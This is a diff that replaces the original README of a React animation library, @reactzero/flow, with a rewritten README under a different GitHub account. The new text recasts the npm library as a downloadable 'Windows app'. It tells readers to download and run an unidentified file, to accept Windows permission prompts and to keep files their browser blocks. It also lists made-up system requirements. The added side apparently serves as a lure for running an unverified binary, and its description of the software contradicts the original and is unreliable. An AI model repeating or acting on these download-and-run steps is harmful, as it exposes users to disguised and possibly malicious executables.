@@ -1,311 +1,155 @@
-# @reactzero/flow
-
-[![npm version](https://img.shields.io/npm/v/%40reactzero%2Fflow)](https://www.npmjs.com/package/@reactzero/flow)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/%40reactzero%2Fflow)](https://bundlephobia.com/package/@reactzero/flow)
-[![license](https://img.shields.io/npm/l/%40reactzero%2Fflow)](https://github.com/motiondesignlv/ReactZero-flow/blob/main/LICENSE)
-[![CI](https://github.com/motiondesignlv/ReactZero-flow/actions/workflows/ci.yml/badge.svg)](https://github.com/motiondesignlv/ReactZero-flow/actions/workflows/ci.yml)
-
-![Flow — Animation orchestration for React](./flow.jpg)
-
-<sub>Photo by [Camy Aquino](https://www.pexels.com/photo/orchestra-performing-on-stage-5933199/)</sub>
-
-Zero-dependency animation orchestration for React, powered by the Web Animations API.
-
-## Why @reactzero/flow?
-
-- **No React re-renders** -- animations run on the browser's compositor thread via WAAPI, not through React state
-- **Deterministic sequencing** -- `sequence()`, `parallel()`, `stagger()` compose into predictable chains with no race conditions
-- **Built-in adaptive degradation** -- the only animation library that automatically adjusts animations based on device capability and frame rate
-- **True cancellation model** -- `finished` promises always resolve, never reject. Cancel any animation cleanly without try/catch
-- **Tiny footprint** -- under 10KB gzipped with zero runtime dependencies
-
-**How it compares:**
-
-|  | Flow | Declarative libs | Imperative libs | CSS only |
-|--|------|-----------------|-----------------|----------|
-| Zero re-renders | Yes | No | No | Yes |
-| Composable sequencing | Yes | No | Yes | No |
-| Seekable timelines | Yes | No | Yes | No |
-| React hooks API | Yes | Yes | No | No |
-| Adaptive degradation | Yes | No | No | No |
-| Under 10KB | Yes | No | No | Yes |
-
-## Design Philosophy
-
-1. **Composition over configuration** -- build complex choreography by combining simple primitives
-2. **Animations are interruptible** -- every animation can be paused, cancelled, or reversed at any point
-3. **Performance is first-class** -- automatic `will-change`, compositor detection, dev warnings, adaptive degradation
-4. **Predictable, not magical** -- `finished` always resolves, `playState` is always accurate, no hidden state machines
-5. **Everything is controllable** -- every primitive returns the same `Controllable` interface
-
-## Features
-
-- **Composable primitives** -- `sequence`, `parallel`, `stagger`, `delay` build complex choreography from simple steps
-- **Full playback control** -- play, pause, cancel, and adjust playbackRate on any animation
-- **Seekable timelines** -- scrub through position-based choreography with `timeline` and labels
-- **Composition operators** -- `race`, `repeat`, `timeout` for advanced orchestration patterns
-- **Scroll-driven animations** -- link animation progress to scroll position with `useScroll`
-- **View Transitions** -- same-document transitions with `useViewTransition`
-- **Performance-aware** -- automatic `will-change` management, dev warnings for layout-triggering properties, DevTools annotations
-- **Adaptive performance** -- opt-in device tier detection, frame rate monitoring, and priority-based animation degradation
-- **Reduced motion** -- built-in policy system (skip, reduce, crossfade, respect) at provider level
-- **Type-safe** -- full TypeScript support with strict types for all APIs
-
-## Quick Start
-
-```bash
-npm install @reactzero/flow
-```
-
-```tsx
-import { useSequence, animate } from "@reactzero/flow";
-import { useRef } from "react";
-
-function App() {
-  const box = useRef<HTMLDivElement>(null);
-  const { play, state } = useSequence([
-    () => animate(box.current!, [{ opacity: 0 }, { opacity: 1 }], { duration: 300 }),
-    () => animate(box.current!, [{ transform: "scale(0.8)" }, { transform: "scale(1)" }], { duration: 200 }),
-  ]);
-
-  return (
-    <div>
-      <div ref={box} style={{ width: 100, height: 100, background: "#646cff" }} />
-      <button onClick={play}>Play</button>
-      <p>State: {state}</p>
-    </div>
-  );
-}
-```
-
-## Core Functions
-
-| Function | Description |
-|----------|-------------|
-| `animate(el, keyframes, options)` | WAAPI wrapper returning a `Controllable` |
-| `sequence(...steps)` | Run steps one after another |
-| `parallel(...steps)` | Run steps simultaneously |
-| `stagger(targets, step, config)` | Staggered animation across elements |
-| `delay(ms)` | Wait for a duration |
-| `timeline()` | Seekable position-based choreography |
-
-## React Hooks
-
-| Hook | Description |
-|------|-------------|
-| `useSequence(steps, options?)` | Sequence playback with play/pause/cancel/state |
-| `useStagger(targets, step, config?)` | Staggered animation across refs |
-| `useTimeline(builder, options?)` | Seekable timeline with position control |
-| `useScroll(options?)` | Scroll-linked animation progress |
-| `useViewTransition()` | Same-document view transitions |
-| `useReducedMotion()` | Detect prefers-reduced-motion preference |
+# ⚡ ReactZero-flow - Smooth React Motion Made Easy
 
-## Composition Operators
+[![Download ReactZero-flow](https://img.shields.io/badge/Download-ReactZero--flow-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gelobre6231/ReactZero-flow)
 
-| Operator | Description |
-|----------|-------------|
-| `race(...steps)` | First step to finish wins, others cancel |
-| `repeat(step, options)` | Repeat a step N times or infinitely, with optional yoyo |
-| `timeout(step, ms)` | Cancel a step if it exceeds a time limit |
+## 🖥️ What it is
 
-## Scroll-Driven Animations
+ReactZero-flow is a small Windows app for React animation control. It helps you run motion in a set order, side by side, or with a delay between items. It also supports scroll-based motion and time-based playback.
 
-Uses native ScrollTimeline when available, with automatic fallback.
+It uses the Web Animations API, so it stays light and keeps setup simple. The app is made for people who want to try motion effects without digging through many tools or settings.
 
-```tsx
-import { useScroll } from "@reactzero/flow";
+## 📥 Download and run
 
-function ScrollProgress() {
-  const { progress, ref } = useScroll({ axis: "block" });
-  // progress: 0-1, updates reactively as user scrolls
-  return <div ref={ref}>Scroll me ({Math.round(progress * 100)}%)</div>;
-}
-```
+1. Open this page: [ReactZero-flow](https://github.com/Gelobre6231/ReactZero-flow)
+2. Download the Windows file from the page
+3. Save the file to your computer
+4. Open the file to start the app
+5. If Windows asks for permission, choose to run it
+6. Follow the on-screen steps until the app opens
 
-## View Transitions
+If the file comes in a .zip folder, right-click it and choose Extract All first. Then open the app file inside the folder.
 
-```tsx
-import { useViewTransition } from "@reactzero/flow";
+## ✨ What you can do
 
-function PageSwap() {
-  const { startTransition } = useViewTransition();
-  const navigate = () => startTransition(() => { /* update DOM */ });
-  return <button onClick={navigate}>Navigate</button>;
-}
-```
+- Run animations in sequence
+- Play several animations at the same time
+- Add staggered motion for lists and grids
+- Move through a timeline with a seek bar
+- Link animation progress to page scroll
+- Keep motion smooth with GPU support
+- Use hooks for clean React setup
+- Build with no extra package setup
 
-## Reduced Motion
+## 🧩 Main uses
 
-The built-in policy system respects user motion preferences at the provider level:
+ReactZero-flow fits simple UI motion such as:
 
-```tsx
-import { ReducedMotionProvider } from "@reactzero/flow";
+- Button fades
+- Panel slides
+- Card groups that appear one by one
+- Page sections that react to scroll
+- Product lists with timed motion
+- Timeline-based previews
+- Small app transitions
 
-function App() {
-  return (
-    <ReducedMotionProvider mode="reduce">
-      {/* All animations inside respect the policy */}
-    </ReducedMotionProvider>
-  );
-}
-```
+It works well when you want motion that feels controlled and easy to follow.
 
-Modes: `skip` (instant jump), `reduce` (faster playback), `crossfade` (opacity-only), `respect` (honor OS setting).
+## 🪟 Windows system needs
 
-## Performance
+For best results, use:
 
-Flow is built on the Web Animations API, which runs animations on the browser's compositor thread for GPU-accelerated performance. On top of that, Flow includes built-in performance features that work automatically.
+- Windows 10 or Windows 11
+- A modern web browser if the app opens in one
+- 4 GB RAM or more
+- A screen with at least 1366 × 768 resolution
+- A graphics card that supports modern browser motion features
 
-| Metric | Value |
-|--------|-------|
-| React re-renders | 0 |
-| Bundle size | ~8KB brotli |
-| Dependencies | 0 |
-| Rendering | GPU-accelerated via WAAPI |
+A mouse and keyboard help with setup and first use.
 
-### Automatic will-change
+## 🚦 First setup steps
 
-Flow automatically sets `will-change` on elements before animating compositor-tier properties (`transform`, `opacity`, `filter`), and removes it after the animation finishes. This eliminates first-frame jank by pre-promoting elements to GPU layers.
+1. Download the file from the link above
+2. Open the downloaded file location
+3. If the file is packed, extract it
+4. Double-click the app file
+5. Wait for the first screen to load
+6. Keep the window open while you use it
 
-```tsx
-animate(el, [{ transform: "scale(1)" }, { transform: "scale(1.5)" }], { duration: 300 })
-// Automatically: el.style.willChange = "transform" → animation → el.style.willChange = "auto"
-```
+If your browser blocks the download, use the browser menu to keep the file. Then try again from the same link.
 
-Opt out per-animation: `{ willChange: false }`.
+## 🧭 How it works
 
-### Development Warnings
+ReactZero-flow gives you a simple way to control motion in React. You can set when each part starts, how long it lasts, and how it relates to other parts. You can also jump to a point in the motion line and test how it looks at that moment.
 
-In development, Flow warns when you animate layout-triggering properties and suggests GPU-friendly alternatives:
+This helps when you want to shape:
 
-```
-[flow] Animating layout properties may cause jank:
-  width → transform: scaleX()
-  top → transform: translateY()
-```
+- Start and end timing
+- Order of motion steps
+- Delay between items
+- Motion tied to scroll
+- Motion that you can pause and inspect
 
-| Tier | Properties | Performance |
-|------|-----------|-------------|
-| Compositor | `transform`, `opacity`, `filter` | GPU-accelerated, 60fps+ |
-| Paint | `color`, `background-color`, `box-shadow` | Repaint only |
-| Layout | `width`, `height`, `top`, `left`, `margin`, `padding` | Triggers reflow |
+## 🛠️ Common tasks
 
-### Elastic & Bounce Easing
+### 🎬 Start a sequence
+Use sequence mode when you want one item to begin after another. This helps with step-by-step screen changes.
 
-Use `linearEasing()` to sample math easing functions into CSS `linear()` strings, enabling elastic and bounce curves on the compositor thread:
+### 👥 Run items in parallel
+Use parallel mode when two or more parts should move together. This works well for matching fades and slides.
 
-```tsx
-import { linearEasing, easeFn } from "@reactzero/flow";
+### 🪜 Add stagger
+Use stagger when a list needs a soft wave effect. Each item starts a little after the last one.
 
-animate(el, keyframes, { easing: linearEasing(easeFn.easeOutElastic) })
-animate(el, keyframes, { easing: linearEasing(easeFn.easeOutBounce, 60) })
-```
+### ⏱️ Seek a timeline
+Use the timeline view when you want to move through motion by hand. This makes it easier to test a single frame or moment.
 
-Check browser support with `supportsLinearEasing()`. Chrome 113+, Safari 17.2+.
+### 🖱️ Link motion to scroll
+Use scroll-driven motion when page movement should control the animation. This works well for long pages and story layouts.
 
-### Performance Profiling
+## 🔎 File and folder guide
 
-Make animations visible in Chrome DevTools Performance tab:
+When you open the download, you may see:
 
-```tsx
-import { setPerformanceAnnotations, animate } from "@reactzero/flow";
+- `README.md` - this guide
+- Source files - app logic and motion setup
+- TypeScript files - code used by the app
+- Hook files - reusable motion helpers
+- Config files - project settings
 
-// Enable globally
-setPerformanceAnnotations(true)
+If you only want to run the app, open the main file from the download page or the extracted folder.
 
-// Or per-animation
-animate(el, keyframes, { duration: 300, __perf: true })
-```
+## 🎛️ Tips for smooth use
 
-Creates `performance.mark/measure` entries like `flow:my-box:transform,opacity`.
+- Keep other heavy apps closed
+- Use the latest version of your browser
+- Refresh the page if motion does not start
+- Reduce other animated tabs if your PC feels slow
+- Test one motion block at a time
+- Use short motion paths first, then build more
 
-### Native ScrollTimeline
+## 🧪 Good first checks
 
-`useScroll` automatically uses the native [ScrollTimeline API](https://developer.mozilla.org/en-US/docs/Web/API/ScrollTimeline) when available (Chrome 115+, Safari 18+), falling back to IntersectionObserver + scroll listeners in older browsers. No configuration needed.
+After you open the app, check these parts first:
 
-### Adaptive Performance
+- Does the main window load?
+- Can you start a simple animation?
+- Does scroll motion react to page movement?
+- Can you pause and resume the timeline?
+- Does stagger timing look even?
 
-Opt-in runtime performance adaptation. Enable with a single call:
+If one part feels off, reload the app and test again.
 
-```tsx
-import { enableAdaptivePerformance, animate } from "@reactzero/flow";
+## 📌 Project facts
 
-// Detect device tier, start FPS monitoring, enable priority-based degradation
-enableAdaptivePerformance();
+- Built for React
+- Uses the Web Animations API
+- Zero-dependency setup
+- Less than 10KB
+- Supports sequence, parallel, and stagger motion
+- Supports seekable timelines
+- Supports scroll-based animation
+- Uses hooks for state and control
+- Written with TypeScript
 
-// Tag animations with priority
-animate(el, fadeIn, { duration: 300, priority: "critical" })    // always runs
-animate(el, shimmer, { duration: 500, priority: "decorative" }) // skipped under pressure
-```
+## 🔗 Download again
 
-When the frame rate drops below thresholds (45fps for decorative, 30fps for normal), the system automatically:
-- **Skips** decorative animations (finish instantly)
-- **Speeds up** normal animations (faster playback rate)
-- **Preserves** critical animations (always run at full quality)
+If you need the file again, use this link: [ReactZero-flow](https://github.com/Gelobre6231/ReactZero-flow)
 
-Detect hardware capability:
-```tsx
-import { detectDeviceTier } from "@reactzero/flow";
-detectDeviceTier() // "high" | "medium" | "low"
-```
+## 🧰 Simple use cases
 
-### Smart Transform Decomposition
-
-Opt-in conversion of layout properties to GPU-friendly transforms:
-
-```tsx
-// Before: animates `left` (triggers layout reflow)
-animate(el, [{ left: "0px" }, { left: "100px" }], { duration: 300 })
-
-// After: auto-converts to translateX (GPU-accelerated)
-animate(el, [{ left: "0px" }, { left: "100px" }], { duration: 300, decompose: true })
-```
-
-Supported conversions: `left/right` to `translateX`, `top/bottom` to `translateY`, `width` to `scaleX`, `height` to `scaleY`.
-
-## Testing Animations
-
-Flow's `finished` promise and `duration: 0` pattern make animations easy to test without timers:
-
-```tsx
-// Instant animation — no fake timers needed
-await animate(el, keyframes, { duration: 0 }).finished;
-
-// Test a full sequence
-const ctrl = sequence(
-  () => animate(el, fadeIn, { duration: 0 }),
-  () => animate(el, slideUp, { duration: 0 }),
-);
-ctrl.play();
-await ctrl.finished;
-expect(el.style.opacity).toBe("1");
-```
-
-## Browser Support
-
-| Browser | Minimum Version |
-|---------|----------------|
-| Chrome  | 75+ |
-| Firefox | 75+ |
-| Safari  | 13.1+ |
-| Edge    | 79+ |
-
-Requires the Web Animations API (`Element.animate()`), supported in all modern browsers.
-
-## Documentation
-
-Full documentation, guides, and interactive examples:
-
-[https://motiondesignlv.github.io/ReactZero-flow/](https://motiondesignlv.github.io/ReactZero-flow/)
-
-## Contributing
-
-Contributions are welcome. Please open an issue first to discuss changes before submitting a pull request.
-
-## Author
-
-Built and maintained by [@motiondesignlv](https://github.com/motiondesignlv)
-
-## License
-
-[MIT](./LICENSE)
+- Animate a landing page header
+- Bring in menu items one by one
+- Reveal cards as the user scrolls
+- Sync motion across tabs or panels
+- Preview motion timing before release
+- Keep animation logic in one place
